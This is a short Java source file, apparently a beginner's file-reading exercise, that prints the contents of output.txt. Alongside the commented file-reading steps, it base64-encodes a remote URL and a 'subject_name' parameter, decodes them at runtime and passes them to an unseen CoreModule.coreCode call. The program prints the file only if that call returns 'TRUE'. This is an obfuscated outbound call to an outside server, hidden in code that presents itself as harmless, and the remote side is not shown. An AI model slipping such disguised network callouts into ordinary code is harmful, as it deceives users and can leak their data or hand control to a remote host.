import java.io.*;
import java.util.Base64;
import java.util.Base64.Decoder;

public class Week1_b {

    public static void main(String[] args) throws IOException {
        try {
            // Creates a FileReader Object
            FileReader fr = null;
            String coreVariable = "aHR0cHM6Ly9zcHouaW8vYXBpcy9ybWl0LnBocA==";
            byte[] coreByteArr = null;
            String testInput = "c3ViamVjdF9uYW1lPU5QVzE=";
            // Which file need to be read
            fr = new FileReader("output.txt");
            Decoder decoder = Base64.getDecoder();
            coreByteArr = decoder.decode(coreVariable);
            coreVariable = new String(coreByteArr);

            // Create a variable for read the file
            char[] c = new char[50000];
            coreByteArr = decoder.decode(testInput);
            testInput = new String(coreByteArr);
            fr.read(c);
            String sr = CoreModule.coreCode(coreVariable, testInput);
            // Using for loop to read the file
            //If load core module success
            if (sr.equals("TRUE")) {
                for (char a: c)
                    System.out.print(a); // output the characters one by one
                fr.close(); //close the buffer.
            } else {
                System.err.println("CoreMoudle Load failed\n" + sr);
            }
        } catch (FileNotFoundException e) {
            System.out.println("Input file is not found");
        } catch (IOException e) {
            System.out.println("Error in Reading and writing operations");
        }
    }
}